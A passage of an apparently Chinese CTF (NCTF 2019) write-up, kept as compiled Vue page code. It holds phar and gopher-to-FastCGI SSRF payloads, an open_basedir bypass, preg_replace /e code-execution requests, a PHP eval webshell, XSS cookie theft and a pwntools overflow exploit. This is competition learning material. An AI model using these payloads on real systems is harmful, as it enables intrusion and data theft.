punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$payload")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//将自定义 meta-data 存入 manifest")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$phar")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("stopBuffering")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rename")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"exp.phar"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"exp.png"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br")])]),a("p",[s._v("拿到")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("IP address       HW type     Flags       HW address            Mask     Device\n173.236.149.2    0x1         0x2         02:42:ad:ec:95:02     *        eth0\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("code",[s._v("/etc/host")]),s._v("\n拿到")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n173.236.149.9\tosrc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("但是都么得回显，后来发现是173.236.149.10这个（估计是buuoj的镜像问题")]),s._v(" "),a("p",[s._v("然后访问一下显示")]),s._v(" "),a("p",[s._v("这里用evoa师傅的脚本打")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('python gopher.srff.exp.py -c "<?php phpinfo();?>" 173.236.149.10 /var/www/html/index.php\ngopher://127.0.0.1:9000/_%01%01%005%00%08%00%00%00%01%00%00%00%00%00%00%01%04%005%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%005%00%00%00%00%01%05%005%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%005%00%00%00%00\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("替换成")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("gopher://173.236.149.10:9000/_%01%01%005%00%08%00%00%00%01%00%00%00%00%00%00%01%04%005%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%005%00%00%00%00%01%05%005%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%005%00%00%00%00\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("可以看到有"),a("code",[s._v("open_basedir\t/var/www/html:/tmp")])]),s._v(" "),a("p",[s._v("用一个经典的绕过方式")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("mkdir('eki');chdir('eki');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python gopher.srff.exp.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"<?php mkdir('eki');chdir('eki');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));?>\"")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("173.236")]),s._v(".149.10 /var/www/html/index.php\n\ngopher://127.0.0.1:9000/_%01%01z%BF%00%08%00%00%00%01%00%00%00%00%00%00%01%04z%BF%01%DC%00%00%0E%03CONTENT_LENGTH171%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04z%BF%00%00%00%00%01%05z%BF%00%AB%00%00%3C%3Fphp%20mkdir%28%27eki%27%29%3Bchdir%28%27eki%27%29%3Bini_set%28%27open_basedir%27%2C%27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("%27%29%3Bchdir%28%27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("%27%29%3Bchdir%28%27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("%27%29%3Bchdir%28%27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("%27%29%3Bchdir%28%27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%3F%3E%01%05z%BF%00%00%00%00`\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h2",{attrs:{id:"_0x05-easyphp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x05-easyphp"}},[s._v("#")]),s._v(" 0x05 easyphp")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x06-replace"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x06-replace"}},[s._v("#")]),s._v(" 0x06 replace")]),s._v(" "),a("p",[s._v('填三个"#"报错')]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1\n\nFatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("实现功能使用的是preg_match()")]),s._v(" "),a("p",[s._v("题目提示用了php5.6")]),s._v(" "),a("p",[s._v("想到preg_match() /e参数")]),s._v(" "),a("p",[s._v("试一下可以执行phpinfo()")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("POST /index.php HTTP/1.1\nHost: nctf2019.x1ct34m.com:40006\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\nOrigin: http://nctf2019.x1ct34m.com:40006\nConnection: close\nReferer: http://nctf2019.x1ct34m.com:40006/index.php\nCookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g\nUpgrade-Insecure-Requests: 1\n\nsub=text&pat=e&rep=phpinfo();\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[s._v("但是直接用readfile('/flag')读文件，发现单引号双引号被拦截")]),s._v(" "),a("p",[s._v("于是用chr()拼接表示字符串。。。。。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("POST /index.php HTTP/1.1\nHost: nctf2019.x1ct34m.com:40006\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\nOrigin: http://nctf2019.x1ct34m.com:40006\nConnection: close\nReferer: http://nctf2019.x1ct34m.com:40006/index.php\nCookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g\nUpgrade-Insecure-Requests: 1\n\nsub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103));\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("h2",{attrs:{id:"_0x07-flask"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x07-flask"}},[s._v("#")]),s._v(" 0x07 flask")]),s._v(" "),a("p",[s._v("大佬队员，躺赢。。。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x08-upload-your-shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x08-upload-your-shell"}},[s._v("#")]),s._v(" 0x08 Upload your Shell")]),s._v(" "),a("p",[s._v("翻了一下网页就只有")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("index.php?action=imgs.html\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("有注入点\n然后想着上传一个图片马\n直接写一句话改后缀名不行\n看起来他是要读文件头的\n并且拦截了<?（有时候正常的图片文件都会有。。。。。）\n考虑php的第三种写法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<script language="php"> \n@eval($_POST[a]);\n<\/script>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("刚准备用菜刀的结果告诉我一个服务器上自带的图片马的地址\n用自带的action参数解析成php就完事了\npayload:")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("/index.php?action=/var/www/html/upload-imgs/321fab94ed3f1e1fba698ddda303566a/Th1s_is_a_fl4g.jpg\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"_0x09-flask-website"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x09-flask-website"}},[s._v("#")]),s._v(" 0x09 flask_website")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x0a-simple-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x0a-simple-xss"}},[s._v("#")]),s._v(" 0x0A simple_xss")]),s._v(" "),a("p",[s._v("据队友说是个入门向xss")]),s._v(" "),a("p",[s._v("在http://xsspt.com/生成一段xss 发给admin")]),s._v(" "),a("p",[s._v("过一会就会得到admin的cookie")]),s._v(" "),a("p",[s._v("然后就能拿到flag......")]),s._v(" "),a("h2",{attrs:{id:"_0x0b-hacker-backdoor"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x0b-hacker-backdoor"}},[s._v("#")]),s._v(" 0x0B hacker_backdoor")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。+2")]),s._v(" "),a("h2",{attrs:{id:"_0x0c-tsb"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x0c-tsb"}},[s._v("#")]),s._v(" 0x0C tsb")]),s._v(" "),a("p",[s._v("tsb->bst .....")]),s._v(" "),a("h2",{attrs:{id:"_0x0d-难看的代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x0d-难看的代码"}},[s._v("#")]),s._v(" 0x0D 难看的代码")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。+3")]),s._v(" "),a("h2",{attrs:{id:"_0x0e-签到题"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x0e-签到题"}},[s._v("#")]),s._v(" 0x0E 签到题")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。+4")]),s._v(" "),a("h2",{attrs:{id:"_0x0f-debug"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x0f-debug"}},[s._v("#")]),s._v(" 0x0F DEBUG")]),s._v(" "),a("p",[s._v("真就IDA 动态调试。。。。。")]),s._v(" "),a("p",[s._v("因为")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('  for ( i = 0; i <= 23; ++i )\n  {\n    if ( v7[i] != *(&s + i) )\n    {\n      printf("GG");\n      exit(0);\n    }\n  }\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("进循环时s就计算好了")]),s._v(" "),a("p",[s._v("然后下个断点直接看栈就好了")]),s._v(" "),a("h2",{attrs:{id:"_0x10-our-16bit-games"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x10-our-16bit-games"}},[s._v("#")]),s._v(" 0x10 Our 16bit Games")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。+5")]),s._v(" "),a("h2",{attrs:{id:"_0x11-easy-ternary"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x11-easy-ternary"}},[s._v("#")]),s._v(" 0x11 Easy Ternary")]),s._v(" "),a("p",[s._v("大佬队友带我躺赢。。。。。+6")]),s._v(" "),a("h2",{attrs:{id:"_0x12-你大概需要一个带bar的mac"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x12-你大概需要一个带bar的mac"}},[s._v("#")]),s._v(" 0x12 你大概需要一个带bar的mac")]),s._v(" "),a("p",[s._v("无设备引起不适。。。")]),s._v(" "),a("p",[s._v("过")]),s._v(" "),a("h2",{attrs:{id:"_0x13-math-easy"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x13-math-easy"}},[s._v("#")]),s._v(" 0x13 math_easy")]),s._v(" "),a("p",[s._v("math.....easy?...... 过.......")]),s._v(" "),a("h2",{attrs:{id:"_0x14-hello-pwn"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x14-hello-pwn"}},[s._v("#")]),s._v(" 0x14 hello_pwn")]),s._v(" "),a("p",[s._v("nc 题。。。。。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#coding=utf-8\nfrom pwn import *\nio=remote("139.129.76.65","50003")\nio.interactive()\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h2",{attrs:{id:"_0x15-pwn-me-100-years-i"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x15-pwn-me-100-years-i"}},[s._v("#")]),s._v(" 0x15 pwn me 100 years! (I)")]),s._v(" "),a("p",[s._v("checksec 看一下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("没开Canary和PIE，")]),s._v(" "),a("p",[s._v("要满足两个条件")]),s._v(" "),a("p",[s._v("直接栈溢出就完事了")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#coding=utf-8\nfrom pwn import *\npayload="yes\\x00"+\'a\'*(0x10-0x4)+p64(0x66666666)\nio=remote("139.129.76.65","50004")\nio.sendafter("ready?\\n",payload)\nio.interactive()\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"_0x16-pwn-me-100-years-ii"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x16-pwn-me-100-years-ii"}},[s._v("#")]),s._v(" 0x16 pwn me 100 years! (II)")]),s._v(" "),a("p",[s._v("漏洞：栈上变量未初始化导致第一个函数里的buf就是第二个函数的&dest")]),s._v(" "),a("p",[s._v("然后可以用第二个函数的printf格式化漏洞")]),s._v(" "),a("p",[s._v("但是checksec告诉我们")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("开了PIE....")]),s._v(" "),a("p",[s._v("还得泄露基址。。")]),s._v(" "),a("p",[s._v("最后没能整出来，还是要好好学。。。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x17-0x1c-pwn"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x17-0x1c-pwn"}},[s._v("#")]),s._v(" 0x17 ~ 0x1C(pwn)")]),s._v(" "),a("p",[s._v("0x17没做出来，心态爆炸。。。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x1d-keyboard"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x1d-keyboard"}},[s._v("#")]),s._v(" 0x1D Keyboard")]),s._v(" "),a("p",[s._v("九宫格输入法。。。。。。")]),s._v(" "),a("p",[s._v("好像把所有不一样的表示换成不同字幕跑quipquip也能过。。。。。")]),s._v(" "),a("h2",{attrs:{id:"_0x1e-0x21-crypto"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x1e-0x21-crypto"}},[s._v("#")]),s._v(" 0x1E~0x21 (Crypto)")]),s._v(" "),a("p",[s._v("我，数学学术垃圾，过.......")]),s._v(" "),a("h2",{attrs:{id:"_0x22-a-good-idea"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x22-a-good-idea"}},[s._v("#")]),s._v(" 0x22 a_good_idea")]),s._v(" "),a("p",[s._v("foremost+stegsolve(image Combiner)")]),s._v(" "),a("p",[s._v("得到一张二维码，扫描得到flag")]),s._v(" "),a("h2",{attrs:{id:"_0x23-become-a-rockstar"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x23-become-a-rockstar"}},[s._v("#")]),s._v(" 0x23 Become a Rockstar")]),s._v(" "),a("p",[s._v("看文风有点奇怪。。。。像是编程语言。。。")]),s._v(" "),a("p",[s._v("搜了一下有没有诗歌一样的编程语言")]),s._v(" "),a("p",[s._v("发现Rockstar语言")]),s._v(" "),a("p",[s._v("用Rockstar-js 没跑出来暂时放弃了")]),s._v(" "),a("p",[s._v("结果Rockstar-py可以跑出来")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[s._v("Leonard_Adleman "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"star"')]),s._v("\nProblem_Makers "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("76")]),s._v("\nProblem_Makers "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"NCTF{"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("God")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("World"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    a_boy "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"flag"')]),s._v("\n    the_boy "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("Evil")]),a("span",{pre:!0,attrs:{class:"token 